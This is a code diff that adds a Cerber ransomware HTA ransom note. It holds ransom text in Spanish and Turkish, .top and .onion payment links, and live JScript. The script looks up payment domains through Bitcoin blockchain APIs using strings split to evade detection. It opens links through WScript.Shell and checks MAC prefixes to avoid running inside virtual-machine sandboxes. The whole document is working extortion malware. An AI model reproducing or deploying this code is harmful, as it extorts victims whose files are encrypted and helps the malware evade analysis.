+					<li>debería cargarse el sitio; si por alguna razón el sitio no se carga, espere un momento e inténtelo de nuevo.</li>
+				</ol>
+				<p>Si tiene problemas durante la instalación, o durante el uso del Navegador Tor, visite <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> y escriba la solicitud en la barra de búsqueda "instalar para navegadores de Windows" y encontrará muchos vídeos sobre cómo instalar y usar el Navegador Tor.</p>
+				<hr>
+				<p><strong>Información adicional:</strong></p>
+				<p>Encontrará las instrucciones para restaurar sus archivos ("*_READ_THIS_FILE_*.hta") a cualquier carpeta con sus archivos cifrados.</p>
+				<p>Las instrucciones ("*_READ_THIS_FILE_*.hta") en las carpetas con sus archivos cifrados no son virus; las instrucciones ("*_READ_THIS_FILE_*.hta") le ayudarán a descifrar sus archivos.</p>
+				<p>Recuerde que ya se ha producido la peor situación y ahora el futuro de sus archivos depende de su determinación y rapidez de actuación.</p>
+			</div>
+			<div id="tr">
+				<p>Gerekli dosyaları bulamıyor musunuz?<br>Dosyalarınızın içeriği okunamıyor mu?</p>
+				<p>Bunun sebebi, dosyalarınızın adlarının ve içlerindeki verilerin "Cer&#98;er&nbsp;Rans&#111;mware” tarafından kodlanmış olmasıdır.</p>
+				<p>Bu, dosyalarınızın hasarlı olduğu anlamına GELMEZ. Dosyalarınız sadece değiştirilmiştir. Bu değişiklik geri döndürülebilir. Bundan böyle, şifresi çözülene kadar dosyalarınızı kullanamayacaksınız.</p>
+				<p>Dosyalarınızın şifresini güvenle çözmek için tek yol, “Cer&#98;er&nbsp;Decryptor” özel şifresini çözme yazılımını satın almaktır.</p>
+				<p>Dosyalarınızı üçüncü taraf yazılımla kurtarmaya kalkışmanız, dosyalarınız için ölümcül olabilir!</p>
+				<hr>
+				<p>Şifre çözme yazılımını satın alma işlemine kişisel sayfanızdan devam edebilirsiniz:</p>
+				<p><span class="info"><span class="updating">Lütfen bekle...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>Bu sayfa açılmazsa, &nbsp;<span class="button" onclick="return updUrl('tr');">buraya tıklayarak</span>&nbsp; kişisel sayfanız için yeni bir adres oluşturabilirsiniz.</p>
+				<p>Tüm dosyalarınızı kurtarmak için şifre çözme yazılımını nasıl satın alacağınızla ilgili talimatların tamamını bu sayfada bulacaksınız.</p>
+				<p>Ayrıca bu sayfada, "Cer&#98;er&nbsp;Decryptor" nin size yardımcı olacağından emin olmak için dilediğiniz tek bir dosyayı kurtarabileceksiniz.</p>
+				<hr>
+				<p>Kişisel sayfanızı uzun süre kullanamazsanız, sayfayı açmanız için bir yol daha vardır: Tor Tarayıcıyı kurup kullanmak.</p>
+				<ol>
+					<li>İnternet tarayıcınızı çalıştırın (bunun ne olduğunu bilmiyorsanız Internet&nbsp;Explorer’ı çalıştırın);</li>
+					<li>Tarayıcısının adres çubuğuna <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> adresini yazın veya yapıştırın ve ENTER tuşuna basın;</li>
+					<li>sitenin yüklenmesini bekleyin;</li>
+					<li>siteye girdiğinizde, Tor Tarayıcıyı indirmeniz için uygun bağlantıları göreceksiniz; tarayıcıyı indirin ve çalıştırın, kurulum talimatlarını uygulayın ve kurulum tamamlanana kadar bekleyin;</li>
+					<li>Tor Tarayıcıyı çalıştırın;</li>
+					<li>İngilizce sürümü kullanıyorsanız, "Connect" (“Bağlan”) düğmesine tıklayarak bağlantı kurun;</li>
+					<li>Başlatma işlemi tamamlandıktan sonra normal bir internet tarayıcı penceresi açılır;</li>
+					<li>adresini bu tarayıcının adres <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> çubuğuna yazın veya yapıştırın;</li>
+					<li>ENTER tuşuna basın;</li>
+					<li>Site yüklenecektir. Eğer herhangi bir sebepten yüklenmezse bir süre bekleyin ve tekrar deneyin.</li>
+				</ol>
+				<p>Tor Tarayıcıyı kurarken veya kullanırken herhangi bir sorununuz olursa <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> adresine gidin ve arama çubuğuna “install tor browser windows” (“tor tarayıcı windows kurulum”) yazın; burada Tor Tarayıcının kurulumu ve kullanımı ile ilgili birçok eğitim videosu bulabilirsiniz.</p>
+				<hr>
+				<p><strong>Ek bilgi:</strong></p>
+				<p>Dosyalarınızı kurtarmak için talimatları, ("*_READ_THIS_FILE_*.hta") şifrelenmiş dosyaların bulunduğu her klasörde bulabilirsiniz.</p>
+				<p>Şifrelenmiş dosyalarınızın bulunduğu klasörlerdeki ("*_READ_THIS_FILE_*.hta") talimatları birer virüs değildir; ("*_READ_THIS_FILE_*.hta") talimatları, dosyalarınızın şifresini çözmenize yardımcı olacaktır.</p>
+				<p>Unutmayın; zaten olabilecek en kötü şey başınıza geldi ve bundan böyle dosyalarınızın geleceği sizin kararlılığınıza ve ne kadar hızlı adım atacağınıza bağlı.</p>
+			</div>
+		</div>
+	</div>
+	<span></span>
+	<script>
+	var translate = {
+		"en": ["English", "English", "Instructions", "Please, retry after 1 hour."],
+		"ar": ["Arabic", "العربية", "تعليمات", "من فضلك، إعادة المحاولة بعد 1 ساعة."],
+		"zh": ["Chinese", "中文", "说明书", "請在1小時後重試。"],
+		"nl": ["Dutch", "Nederlands", "Instructies", "Gelieve opnieuw te proberen na 1 uur."],
+		"fr": ["French", "Français", "Instructions", "Veuillez réessayer après 1 heure."],
+		"de": ["German", "Deutsch", "Anleitung", "Bitte versuchen Sie es nach 1 Stunde erneut."],
+		"it": ["Italian", "Italiano", "Istruzioni", "Si prega, riprovare dopo 1 ora."],
+		"ja": ["Japanese", "日本語", "説明書", "1時間後に再試行してください。"],
+		"ko": ["Korean", "한국어", "훈령", "1 시간 후에 다시 시도하십시오."],
+		"pl": ["Polish", "Polski", "Instrukcje", "Proszę ponowić próbę po 1 godzinie."],
+		"pt": ["Portuguese", "Português", "Instruções", "Por favor, tente novamente após 1 hora."],
+		"es": ["Spanish", "Español", "Instrucciones", "Por favor, vuelva a intentarlo después de 1 hora."],
+		"tr": ["Turkish", "Türkçe", "Talimatlar", "Lütfen 1 saat sonra tekrar deneyin."]
+	};
+	var nav_lang = navigator.userLanguage.substring(0, 2) || "";
+	var lang = ("en, ar, zh, nl, fr, de, it, ja, ko, pl, pt, es, tr".indexOf(nav_lang) >= 0) ? nav_lang : "en";
+	function showBlock(language) {
+		var elText = document.getElementById("texts").getElementsByTagName("div");
+		for (var i = 0; i < elText.length; i++) {
+			elText[i].style.display = (elText[i].id == language) ? "block" : "none";
+		}
+		document.getElementById("change_language").innerHTML = "&#9745; " + translate[language][1];
+		document.getElementById("change_language").style.display = "block";
+		document.getElementById("change_language").title = translate[language][0];
+		document.getElementById("languages").style.display = "none";
+		document.getElementById("title").innerHTML = translate[language][2];
+	}
+	function changeLanguage1() {
+		var elText = document.getElementById("texts").getElementsByTagName("div");
+		for (var i = 0; i < elText.length; i++) {
+			elText[i].style.display = "none";
+		}
+		document.getElementById("change_language").style.display = "none";
+		document.getElementById("languages").style.display = "block";
+		document.getElementById("title").innerHTML = translate["en"][2];
+	}
+	function getXMLHttpRequest() {
+		if (window.XMLHttpRequest) {
+			return new window.XMLHttpRequest;
+		}
+		else {
+			try {
+				return new ActiveXObject("MSXML2.XMLHTTP.3.0");
+			}
+			catch(error) {
+				return null;
+			}
+		}
+	}
+	function getUrlContent(url, end, callback) {
+		var xhttp = getXMLHttpRequest();
+		if (xhttp) {
+			xhttp.onreadystatechange = function() {
+				if (xhttp.readyState == 4) {
+					if (xhttp.status == 200) {
+						return callback(xhttp.responseText.replace(/[\s ]+/gm, ""), null);
+					}
+					else {
+						return callback(null, true);
+					}
+				}
+			};
+			xhttp.open("GET", url + ((end == 0) ? "?" : "&") + "_=" + new Date().getTime(), true);
+			xhttp.send();
+		}
+		else {
+			return callback(null, true);
+		}
+	}
+	function server10(address, callback) {
+		getUrlContent("http://api.blo"+""+"ckcypher.com/v1/btc/main/addrs/" + address, 0, function(result, error) {
+			if (!error) {
+				var regExp44 = /"tx_hash":"([\w]+)","block_height":[\d]+,"tx_input_n":[\d-]+,"tx_output_n":-/;
+				var tx = regExp44.exec(result);
+				if (tx) {
+					getUrlContent("http://api.blo"+""+"ckcypher.com/v1/btc/main/txs/" + tx[1], 0, function(result, error) {
+						if (!error) {
+							var address = /"outputs":\[{"value":[\d]+,"script":"[\w]+","spent_by":"[\w]+","addresses":\["([\w]+)"/.exec(result);
+							if (address) {
+								return callback(address[1], null);
+							}
+							else {
+								return callback(null, true);
+							}
+						}
+						else {
+							return callback(null, true);
+						}
+					});
+				}
+				else {
+					return callback(null, true);
+				}
+			}
+			else {
+				return callback(null, true);
+			}
+		});
+	}
+	function server20(address, callback) {
+		getUrlContent("http://btc.blo"+""+"ckr.io/api/v1/address/txs/" + address, 0, function(result, error) {
+			if (!error) {
+				var tx = /"tx":"([\w]+)","time_utc":"[\w-:]+","confirmations":[\d]+,"amount":-/.exec(result);
+				if (tx) {
+					getUrlContent("http://btc.blo"+""+"ckr.io/api/v1/tx/info/" + tx[1], 0, function(result, error) {
+						if (!error) {
+							var address = /"vouts":\[{"address":"([\w]+)"/.exec(result);
+							if (address) {
+								return callback(address[1], null);
+							}
+							else {
+								return callback(null, true);
+							}
+						}
+						else {
+							return callback(null, true);
+						}
+					});
+				}
+				else {
+					return callback(null, true);
+				}
+			}
+			else {
+				return callback(null, true);
+			}
+		});
+	}
+	function server30(address, callback) {
+		getUrlContent("https://bit"+""+"aps.com/api/address/transactions/" + address + "/0/sent/all", 0, function(result, error) {
+			if (!error) {
+				var tx = /,"([\w]+)"/.exec(result);
+				if (tx) {
+					getUrlContent("https://bit"+""+"aps.com/api/transaction/" + tx[1], 0, function(result, error) {
+						if (!error) {
+							var out_data = /"output":\[{(.*?)}\]/.exec(result);
+							if (out_data) {
+								var address = /"address":\["([\w]+)"\]/.exec(out_data);
+								if (address) {
+									return callback(address[1], null);
+								}
+								else {
+									return callback(null, true);
+								}
+							}
+							else {
+								return callback(null, true);
+							}
+						}
+						else {
+							return callback(null, true);
+						}
+					});
+				}
+				else {
+					return callback(null, true);
+				}
+			}
+			else {
+				return callback(null, true);
+			}
+		});
+	}
+	function server40(address, callback) {
+		getUrlContent("https://cha"+""+"in.so/api/v2/address/btc/" + address, 0, function(result, error) {
+			if (!error) {
+				var txs = result.match(/"outputs":[{"output_no":[\w]+,"address":"[\w]+"/g);
+				if (txs) {
+					var regExp = /"address":"([\w]+)"/;
+					var address = regExp.exec(txs[0]);
+					if (address) {
+						return callback(address[1], null);
+					}
+					else {
+						return callback(null, true);
+					}
+				}
+				else {
+					return callback(null, true);
+				}
+			}
+			else {
+				return callback(null, true);
+			}
+		});
+	}
+	function changeUrl_(address) {
+		var domain = ".t"+"op";
+		var id = "0123-4567-89AB-CDEF-0123";
+		var tor = "p27dokhpz2n7nvgr";
+		var url = "htt"+""+"p://" + tor + "." + address.substr(0, 6).toLowerCase() + domain + "/" + id;
+		var elA = document.getElementsByTagName("a");
+		for (var i = 0; i < elA.length; i++) {
+			if (elA[i].className == "url") {
+				elA[i].href = url;
+				elA[i].innerHTML = url;
+				elA[i].target = "_blank";
+				elA[i].style.display = "inline";
+			}
+		}
+		var elSpan = document.getElementsByTagName("span");
+		for (var i = 0; i < elSpan.length; i++) {
+			if (elSpan[i].className == "updating") {
+				elSpan[i].style.display = "none";
+			}
+		}
+		getUrlContent(url + "?iframe", 1, function(result, error) {
+		});
+	}
+	var attempt = 0;
+	function updUrl(language) {
+		attempt++;
+		if (attempt == 3) {
+			attempt = 0;
+			alert(translate[language][3]);
+		}
+		var elA = document.getElementsByTagName("a");
+		for (var i = 0; i < elA.length; i++) {
+			if (elA[i].className == "url") {
+				elA[i].style.display = "none";
+			}
+		}
+		var elSpan = document.getElementsByTagName("span");
+		for (var i = 0; i < elSpan.length; i++) {
+			if (elSpan[i].className == "updating") {
+				elSpan[i].style.display = "inline-block";
+			}
+		}
+		setTimeout(function() {
+			var address = "17gd1msp5FnMcEMF1MitTNSsYs7w7AQyCt";
+			server10(address, function(result, error) {
+				if (!error) {
+					return changeUrl_(result);
+				}
+				else {
+					server20(address, function(result, error) {
+						if (!error) {
+							return changeUrl_(result);
+						}
+						else {
+							server30(address, function(result, error) {
+								if (!error) {
+									return changeUrl_(result);
+								}
+								else {
+									server40(address, function(result, error) {
+										if (!error) {
+											return changeUrl_(result);
+										}
+										else {
+											var elA = document.getElementsByTagName("a");
+											for (var i = 0; i < elA.length; i++) {
+												if (elA[i].className == "url") {
+													elA[i].style.display = 'inline';
+												}
+											}
+											var elSpan = document.getElementsByTagName("span");
+											for (var i = 0; i < elSpan.length; i++) {
+												if (elSpan[i].className == "updating") {
+													elSpan[i].style.display = "none";
+												}
+											}
+										}
+									});
+								}
+							});
+						}
+					});
+				}
+			});
+		}, 100);
+	}
+	var elLinks = document.getElementById("texts").getElementsByTagName("a");
+	for(var i = 0; i < elLinks.length; i++) {
+		elLinks[i].onclick = function () {
+			var that = this;
+			new ActiveXObject("W"+""+"Script.Shell").Run(that.href);
+			return false;
+		}
+	}
+	showBlock(lang);
+	try {
+		var macAddress = "";
+		var myEnum = new Enumerator(GetObject("w"+"inmgmts:{impersonationLevel=impersonate}").ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"));
+		for (; !myEnum.atEnd() ; myEnum.moveNext()) {
+			var item = myEnum.item();
+			macAddress = item.MACAddress.substr(0, 8);
+		}
+		var blackList = "00:50:56, 00:0C:29, 00:1C:14, 00:05:69, 0A:00:27, 00:03:FF, 00:1C:42, 00:0F:4B, 00:16:3E, 08:00:27";
+		if (blackList.indexOf(macAddress) < 0) {
+			setTimeout(function() {
+				updUrl("en");
+			}, 100);
+		}
+	}
+	catch(error) {
+	}
+	</script>
+</body>
+</html>
